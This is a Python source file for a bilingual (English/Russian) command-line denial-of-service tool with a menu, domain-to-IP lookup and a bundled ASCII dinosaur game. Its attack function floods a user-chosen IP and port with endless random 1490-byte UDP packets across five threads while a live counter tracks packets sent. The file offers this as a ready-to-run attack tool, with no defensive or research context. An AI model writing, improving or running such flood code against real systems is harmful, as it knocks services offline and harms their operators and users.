import os
import time
import socket
import random
from datetime import datetime
import threading
import sys

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
WHITE = '\033[97m'
RESET = '\033[0m'

# Цвет для остального текста (интерфейс, меню и сообщения)
UI_TEXT = BLUE

LANGUAGES = {
    "en": {
        "banner": GREEN + r"""
 ____   ___   ____     _____           _ 
|  _ \ / _ \ / ___|   |_   _|__   ___ | |
| | | | | | | \___ \    | |/ _ \ / _ \| |
| |_| | |_| |  ___) |   | | (_) | (_) | |
|____/ \___/ |_____/    |_|\___/ \___/|_|
                DOS Tool
| Dev: SashaVoden
| Github: github.com/SashaVoden
""" + RESET,
        "menu_1": UI_TEXT + "1. Resolve domain to IP" + RESET,
        "menu_2": UI_TEXT + "2. Start DOS script" + RESET,
        "menu_3": UI_TEXT + "3. Change language" + RESET,
        "menu_0": UI_TEXT + "0. Exit" + RESET,
        "select_option": UI_TEXT + "Select an option: " + RESET,
        "invalid_choice": UI_TEXT + "Invalid choice!" + RESET,
        "goodbye": UI_TEXT + "Goodbye!" + RESET,
        "enter_domain": UI_TEXT + "Enter domain (e.g. example.com): " + RESET,
        "domain_resolved": UI_TEXT + "Domain {domain} resolved to IP: {ip}, Port: {port}" + RESET,
        "error_resolve": UI_TEXT + "Error resolving domain: {e}" + RESET,
        "press_enter": UI_TEXT + "Press Enter to return to menu..." + RESET,
        "script_started": UI_TEXT + "Script started: {time}" + RESET,
        "ip_target": UI_TEXT + "IP Target or exit: " + RESET,
        "exiting": UI_TEXT + "Exiting script..." + RESET,
        "invalid_port": UI_TEXT + "Invalid port!" + RESET,
        "port": UI_TEXT + "Port: " + RESET,
        "target": UI_TEXT + "Target:" + RESET,
        "thread": UI_TEXT + "Thread" + RESET,
        "packets_sent": UI_TEXT + "Packets sent:" + RESET,
        "menu_lang": UI_TEXT + "Select language (en/ru): " + RESET,
        "lang_changed": UI_TEXT + "Language changed to {lang}." + RESET
    },
    "ru": {
        "banner": GREEN + r"""
 ____   ___   ____     _____           _ 
|  _ \ / _ \ / ___|   |_   _|__   ___ | |
| | | | | | | \___ \    | |/ _ \ / _ \| |
| |_| | |_| |  ___) |   | | (_) | (_) | |
|____/ \___/ |_____/    |_|\___/ \___/|_|
                DOS Tool
| Dev: SashaVoden
| Github: github.com/SashaVoden
""" + RESET,
        "menu_1": UI_TEXT + "1. Определить IP по домену" + RESET,
        "menu_2": UI_TEXT + "2. Запустить DOS скрипт" + RESET,
        "menu_3": UI_TEXT + "3. Сменить язык" + RESET,
        "menu_0": UI_TEXT + "0. Выход" + RESET,
        "select_option": UI_TEXT + "Выберите опцию: " + RESET,
        "invalid_choice": UI_TEXT + "Неверный выбор!" + RESET,
        "goodbye": UI_TEXT + "До свидания!" + RESET,
        "enter_domain": UI_TEXT + "Введите домен (например, example.com): " + RESET,
        "domain_resolved": UI_TEXT + "Домен {domain} определён как IP: {ip}, Порт: {port}" + RESET,
        "error_resolve": UI_TEXT + "Ошибка при определении домена: {e}" + RESET,
        "press_enter": UI_TEXT + "Нажмите Enter для возврата в меню..." + RESET,
        "script_started": UI_TEXT + "Скрипт запущен: {time}" + RESET,
        "ip_target": UI_TEXT + "Целевой IP или exit: " + RESET,
        "exiting": UI_TEXT + "Выход из скрипта..." + RESET,
        "invalid_port": UI_TEXT + "Неверный порт!" + RESET,
        "port": UI_TEXT + "Порт: " + RESET,
        "target": UI_TEXT + "Цель:" + RESET,
        "thread": UI_TEXT + "Поток" + RESET,
        "packets_sent": UI_TEXT + "Пакетов отправлено:" + RESET,
        "menu_lang": UI_TEXT + "Выберите язык (en/ru): " + RESET,
        "lang_changed": UI_TEXT + "Язык изменён на {lang}." + RESET
    }
}

current_lang = "en"

def print_slow(text, delay=0.03):
    for char in text:
        print(char, end='', flush=True)
        time.sleep(delay)
    print()

def tr(key, **kwargs):
    return LANGUAGES[current_lang][key].format(**kwargs)

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def print_banner():
    print(tr("banner"))

def progress_bar():
    stages = [
       YELLOW + "[-=-=-=-=-=-=-=-=-=-=-]\n"
    ]
    for stage in stages:
        print_slow(stage, delay=0.3)
        time.sleep(1)

def attack(ip, port, idx, counters):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = random._urandom(1490)
    while True:
        try:
            sock.sendto(bytes_data, (ip, port))
            counters[idx] += 1
        except Exception:
            break

def print_status(counters, ip, port):
    while True:
        clear_screen()
        print_banner()
        print(BLUE + f"{tr('target')} {ip} {tr('port')}{port}" + RESET)
        for i, count in enumerate(counters):
            print(GREEN + f"{tr('thread')} {i+1:<2} ({tr('port')}{port}): {tr('packets_sent')} {count:<8}" + RESET)
        time.sleep(0)

def resolve_domain():
    domain = input(tr("enter_domain"))
    try:
        ip = socket.gethostbyname(domain)
        port = input(tr("port"))
        print_slow(tr("domain_resolved", domain=domain, ip=ip, port=port))
    except Exception as e:
        print_slow(tr("error_resolve", e=str(e)))
    input(tr("press_enter"))

def ddos_menu():
    now = datetime.now()
    print_slow(tr("script_started", time=now.strftime('%Y-%m-%d %H:%M:%S')))
    clear_screen()
    print_banner()
    ip_or_domain = input(tr("ip_target"))
    if ip_or_domain.lower() == "exit":
        print_slow(tr("exiting"))
        time.sleep(1)
        clear_screen()
        return
    try:
        ip = socket.gethostbyname(ip_or_domain)
        if ip != ip_or_domain:
            print_slow(GREEN + f"Resolved target: {ip_or_domain} -> {ip}" + RESET)
    except Exception:
        print_slow(tr("error_resolve", e="Invalid domain or IP!"))
        return
    try:
        port = int(input(tr("port")))
    except ValueError:
        print_slow(tr("invalid_port"))
        return

    progress_bar()
    counters = [0] * 5
    threads = []
    for i in range(5):
        t = threading.Thread(target=attack, args=(ip, port, i, counters))
        t.daemon = True
        t.start()
        threads.append(t)
    status_thread = threading.Thread(target=print_status, args=(counters, ip, port), daemon=True)
    status_thread.start()
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print_slow("\nStopping...")
        time.sleep(1)

def change_language():
    global current_lang
    lang = input(tr("menu_lang")).strip().lower()
    if lang in LANGUAGES:
        current_lang = lang
        print_slow(tr("lang_changed", lang=lang))
    else:
        print_slow(RED + "Language not supported!" + RESET)
    time.sleep(1)

def dino_game():
    import msvcrt

    WIDTH = 40
    HEIGHT = 7
    GROUND = HEIGHT - 2
    dino = ["  |•\\ ", "  /|\\ ", "  /\\ "]
    dino_x = 2
    dino_y = GROUND
    jump = False
    jump_height = 0
    max_jump = 3
    cactus_list = []
    score = 0
    game_over = False

    def draw():
        clear_screen()
        field = [[" " for _ in range(WIDTH)] for _ in range(HEIGHT)]
        # Draw ground
        for x in range(WIDTH):
            field[GROUND+1][x] = "_"
        # Draw dino
        for i, line in enumerate(dino):
            for j, ch in enumerate(line):
                if 0 <= dino_y - (2 - i) < HEIGHT and 0 <= dino_x + j < WIDTH:
                    field[dino_y - (2 - i)][dino_x + j] = ch
        # Draw cactuses
        for cx in cactus_list:
            if 0 <= cx < WIDTH:
                field[GROUND][cx] = "#"
        # Print field
        for row in field:
            print("".join(row))
        print(f"Score: {score}")
        if game_over:
            print_slow("Game Over! Press ESC to exit or R to restart.")

    while True:
        dino_y = GROUND - jump_height
        if not game_over:
            # Move cactuses
            cactus_list = [c - 1 for c in cactus_list if c - 1 >= 0]
            # Spawn cactus
            if random.randint(0, 9) == 0:
                cactus_list.append(WIDTH - 1)
            # Collision
            for cx in cactus_list:
                if dino_x + 2 <= cx <= dino_x + 5 and dino_y + 1 >= GROUND:
                    game_over = True
            # Jump logic
            if jump:
                jump_height += 1
                if jump_height >= max_jump:
                    jump = False
            else:
                if jump_height > 0:
                    jump_height -= 1
            score += 1
        draw()
        # Input
        start_time = time.time()
        while time.time() - start_time < 0.08:
            if msvcrt.kbhit():
                key = msvcrt.getch()
                if key == b' ' and not game_over and jump_height == 0:
                    jump = True
                elif key in (b'\x1b', b'q'):  # ESC or q
                    return
                elif key in (b'r', b'R') and game_over:
                    # Restart
                    cactus_list = []
                    score = 0
                    jump = False
                    jump_height = 0
                    game_over = False
        if game_over:
            time.sleep(0.1)

def main_menu():
    while True:
        clear_screen()
        print_banner()
        print_slow(tr("menu_1"))
        print_slow(tr("menu_2"))
        print_slow(tr("menu_3"))
        print_slow("4. Play Dino Game")
        print_slow(tr("menu_0"))
        choice = input("\n" + tr("select_option"))
        if choice == "1":
            clear_screen()
            resolve_domain()
        elif choice == "2":
            clear_screen()
            ddos_menu()
        elif choice == "3":
            clear_screen()
            change_language()
        elif choice == "4":
            clear_screen()
            dino_game()
        elif choice == "0":
            print_slow(tr("goodbye"))
            break
        else:
            print_slow(RED + "invalid_choice" + RESET)
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
